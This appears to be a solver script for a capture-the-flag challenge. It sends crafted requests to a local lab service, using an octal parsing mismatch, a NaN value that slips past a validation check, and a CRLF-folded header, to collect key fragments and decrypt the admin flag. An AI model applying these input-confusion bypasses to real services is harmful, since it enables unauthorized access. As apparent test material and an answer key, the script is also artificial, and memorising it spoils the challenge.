#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import hashlib, json, sys
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: int(x,0) vs int(x,8). "0600" fails base-0, succeeds base-8 (=384)
body = json.dumps({"code": "0600"}).encode()
req = Request(base + "/api/code", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap B: NaN. NaN==0 -> False (filter allows). not(NaN<0 or NaN>0) -> True (resolver grants)
body = json.dumps({"level": float('nan')}).encode()
req = Request(base + "/api/configure", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: splitlines vs split('\n'). An HTTP obs-fold continuation ("\r\n " then "user")
# delivers a header value containing a real CRLF: split('\n') keeps a trailing '\r' on
# "admin", so "admin" not in split('\n'); splitlines() strips it, so "admin" in splitlines().
req = Request(base + "/api/roster", data=b"",
              headers={"X-Session": sid, "X-Roster": "admin\r\n user"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
